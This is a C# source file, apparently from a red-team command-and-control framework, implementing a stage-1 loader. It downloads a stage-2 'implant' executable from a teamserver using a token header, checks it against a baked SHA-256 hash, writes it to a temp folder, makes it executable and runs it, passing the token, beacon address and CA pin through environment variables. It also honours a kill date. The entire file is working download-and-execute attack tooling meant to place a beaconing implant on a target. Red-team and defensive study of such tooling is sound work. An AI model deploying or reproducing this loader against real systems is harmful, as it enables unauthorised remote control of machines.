// Rod.Stager is the reference .NET stage-1 loader (architecture.md Sec 6): it
// fetches a built stage-2 payload from the teamserver, verifies it against the
// sha256 baked at build time, and runs it; the stage-2 then spends the stager
// token at its own enroll. It is a benign reference: no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The whole program is one fetch-and-exec -- the smallest footprint a
// first-stage loader can honestly have: no protocol bindings, no packages, no
// key material (the deployment credential arrives at run time, exactly as the
// stage-2 takes its own token).

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Rod.Stager;

return await StagerApp.RunAsync(args);

internal static class StagerApp
{
    public static async Task<int> RunAsync(string[] args)
    {
        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        SeedFromBaked();

        string token;
        string enrollUrl;
        string payloadId;
        string outDir;
        string? beaconUrl;
        string? caCertPath;
        try
        {
            (token, enrollUrl, payloadId, outDir, beaconUrl, caCertPath) = ParseArgs(args);
        }
        catch (ExitProgramException ex)
        {
            if (ex.Message is { Length: > 0 } msg)
                Console.Error.WriteLine("rod-stager: " + msg);
            return ex.ExitCode;
        }
        if (KillDatePassed())
        {
            Console.Error.WriteLine("rod-stager: kill date has passed; refusing to run");
            return 1;
        }

        // The fetch rides the same anonymous listener enroll does; the token is
        // verified without being spent, so the stage-2 below can still spend it.
        var fetchUrl = FetchUrl(enrollUrl, payloadId);
        Console.Error.WriteLine($"rod-stager: fetching stage-2 {payloadId} from {BaseOf(fetchUrl)}");
        byte[] stage2;
        try
        {
            stage2 = await FetchAsync(fetchUrl, token, caCertPath, cts.Token);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("rod-stager: fetch: " + ex.Message);
            return 1;
        }

        // The integrity anchor baked at build time (architecture.md Sec 6): a
        // fetch that does not hash to the recorded fingerprint is refused, so a
        // tampered transport cannot make the loader run substituted bytes.
        var actual = Convert.ToHexString(SHA256.HashData(stage2)).ToLowerInvariant();
        if (ExpectedSha256.Length > 0 && actual != ExpectedSha256)
        {
            Console.Error.WriteLine($"rod-stager: stage-2 hash mismatch: expected {ExpectedSha256}, received {actual}");
            return 1;
        }

        // The fetched artifact is a self-contained single-file executable
        // (architecture.md Sec 6); running it means executing the file. The
        // stage-2's own baked profile carries its endpoint, so the only thing
        // handed across the process boundary is the deployment credential.
        var stage2Path = Path.Combine(outDir, OperatingSystem.IsWindows() ? "Rod.Implant.exe" : "Rod.Implant");
        try
        {
            Directory.CreateDirectory(outDir);
            await File.WriteAllBytesAsync(stage2Path, stage2, cts.Token);
            if (!OperatingSystem.IsWindows())
                File.SetUnixFileMode(stage2Path,
                    UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute
                    | UnixFileMode.GroupRead | UnixFileMode.GroupExecute
                    | UnixFileMode.OtherRead | UnixFileMode.OtherExecute);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("rod-stager: write: " + ex.Message);
            return 1;
        }

        Console.Error.WriteLine($"rod-stager: running stage-2 ({stage2.Length} bytes)");
        var start = new System.Diagnostics.ProcessStartInfo
        {
            FileName = stage2Path,
            UseShellExecute = false,
        };
        // The stage-2 takes its token from the environment the same way it
        // takes every other run-time override; the process inherits the rest.
        // An explicit beacon address covers the split topology -- enroll and
        // beacon behind different frontends -- the same flag the implant takes.
        // The CA pin forwards too: the stage-2's beacon mTLS needs the same
        // teamserver identity the loader was told to trust.
        start.Environment["ROD_STAGER_TOKEN"] = token;
        if (beaconUrl is { Length: > 0 })
            start.Environment["ROD_BEACON_URL"] = beaconUrl;
        if (caCertPath is { Length: > 0 })
            start.Environment["ROD_CA_CERT"] = caCertPath;
        using var process = System.Diagnostics.Process.Start(start)
            ?? throw new InvalidOperationException("failed to start the stage-2 process");
        await process.WaitForExitAsync(cts.Token);
        return process.ExitCode;
    }

    // --- Run-time configuration: the bake seeds defaults, flags win. ---

    private static string ExpectedSha256 { get; set; } = "";

    private static (string Token, string EnrollUrl, string PayloadId, string OutDir, string? BeaconUrl, string? CaCertPath) ParseArgs(
        string[] args)
    {
        var token = Environment.GetEnvironmentVariable("ROD_STAGER_TOKEN") ?? "";
        var enrollUrl = Environment.GetEnvironmentVariable("ROD_ENROLL_URL") ?? "";
        var payloadId = Environment.GetEnvironmentVariable("ROD_STAGE2_PAYLOAD_ID") ?? "";
        var outDir = "";
        string? beaconUrl = null;
        string? caCert = null;

        for (var i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-h" or "--help":
                    Console.Error.WriteLine(
                        "usage: rod-stager -token <secret> [-enroll-url <url>] [-payload <guid>] [-beacon-url <host:port>] [-out-dir <dir>] [-ca-cert <pem>]");
                    throw new ExitProgramException(0, null);
                case "-token" or "--token":
                    token = Value(args, ref i);
                    break;
                case "-enroll-url" or "--enroll-url":
                    enrollUrl = Value(args, ref i);
                    break;
                case "-payload" or "--payload":
                    payloadId = Value(args, ref i);
                    break;
                case "-beacon-url" or "--beacon-url":
                    beaconUrl = Value(args, ref i);
                    break;
                case "-out-dir" or "--out-dir":
                    outDir = Value(args, ref i);
                    break;
                case "-ca-cert" or "--ca-cert":
                    caCert = Value(args, ref i);
                    break;
                default:
                    throw new ExitProgramException(1, $"unknown flag {args[i]}");
            }
        }

        if (token.Length == 0)
            throw new ExitProgramException(1, "a stager token is required (-token or ROD_STAGER_TOKEN)");
        if (enrollUrl.Length == 0)
            throw new ExitProgramException(1, "an enroll URL is required (-enroll-url, or bake one into the artifact)");
        if (payloadId.Length == 0)
            throw new ExitProgramException(1, "a stage-2 payload id is required (-payload, or bake one into the artifact)");
        if (outDir.Length == 0)
            outDir = Path.Combine(Path.GetTempPath(), "rod-stager-" + Guid.NewGuid().ToString("N"));

        return (token, enrollUrl, payloadId, outDir, beaconUrl, caCert);
    }

    private static string Value(string[] args, ref int i)
    {
        if (i + 1 >= args.Length)
            throw new ExitProgramException(1, $"{args[i]} expects a value");
        i++;
        return args[i];
    }

    // Applies the build-time baked profile as the defaults (the generated
    // BakedProfile class), leaving any explicit flag or env untouched. Malformed
    // baked data is ignored -- a bad bake must not crash the loader.
    private static void SeedFromBaked()
    {
        var baked = BakedProfile.Json;
        if (baked.Length == 0)
            return;
        try
        {
            var raw = DecodeBase64Url(baked);
            using var doc = System.Text.Json.JsonDocument.Parse(raw);
            var root = doc.RootElement;
            SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
            SetEnvIfPresent(root, "stage2PayloadId", "ROD_STAGE2_PAYLOAD_ID");
            SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
            if (root.TryGetProperty("stage2Sha256", out var sha)
                && sha.ValueKind == System.Text.Json.JsonValueKind.String)
            {
                var value = sha.GetString();
                if (!string.IsNullOrEmpty(value))
                    ExpectedSha256 = value;
            }
        }
        catch
        {
            // Ignore a malformed bake; flags and env still work.
        }
    }

    private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
    {
        if (root.TryGetProperty(jsonKey, out var value)
            && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var s = value.GetString();
            if (!string.IsNullOrEmpty(s) && Environment.GetEnvironmentVariable(envKey) is null)
                Environment.SetEnvironmentVariable(envKey, s);
        }
    }

    private static bool KillDatePassed()
    {
        var raw = Environment.GetEnvironmentVariable("ROD_KILL_DATE");
        if (raw is null)
            return false;
        if (!DateTimeOffset.TryParse(raw, out var killDate))
            return false;
        return DateTimeOffset.Now > killDate;
    }

    // --- The fetch: plain HTTP(S) GET with the token in a header. ---

    private static async Task<byte[]> FetchAsync(
        string url, string token, string? caCertPath, CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        if (caCertPath is { Length: > 0 })
        {
            var ca = new X509Certificate2Collection();
            ca.ImportFromPemFile(caCertPath);
            handler.SslOptions.RemoteCertificateValidationCallback = (_, cert, chain, _) =>
            {
                if (cert is null || chain is null)
                    return false;
                chain.ChainPolicy.TrustMode = X509ChainTrustMode.CustomRootTrust;
                foreach (var root in ca)
                    chain.ChainPolicy.CustomTrustStore.Add(root);
                return chain.Build((X509Certificate2)cert);
            };
        }

        using var client = new HttpClient(handler, disposeHandler: true);
        using var request = new HttpRequestMessage(HttpMethod.Get, url);
        request.Headers.Add("X-Stager-Token", token);
        using var response = await client.SendAsync(request, cancellationToken);
        if (!response.IsSuccessStatusCode)
            throw new InvalidOperationException($"the teamserver answered {((int)response.StatusCode)} {(response.ReasonPhrase ?? "")}".TrimEnd());
        return await response.Content.ReadAsByteArrayAsync(cancellationToken);
    }

    // Derives the fetch URL off the enroll URL: the stage-2 route hangs off the
    // same listener root (architecture.md Sec 8 -- the anonymous implant
    // listener serves both enroll and the staged fetch).
    private static string FetchUrl(string enrollUrl, string payloadId)
    {
        const string suffix = "/implants/enroll";
        var root = enrollUrl;
        if (root.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            root = root[..^suffix.Length];
        return root.TrimEnd('/') + "/implants/stage2/" + payloadId;
    }

    private static string BaseOf(string url)
    {
        var scheme = url.IndexOf("://", StringComparison.Ordinal);
        if (scheme < 0)
            return url;
        var authorityEnd = url.IndexOf('/', scheme + 3);
        return authorityEnd < 0 ? url : url[..authorityEnd];
    }

    private static string DecodeBase64Url(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(padded));
    }

    private sealed class ExitProgramException : Exception
    {
        public int ExitCode { get; }

        public ExitProgramException(int exitCode, string? message)
            : base(message ?? "")
            => ExitCode = exitCode;
    }
}
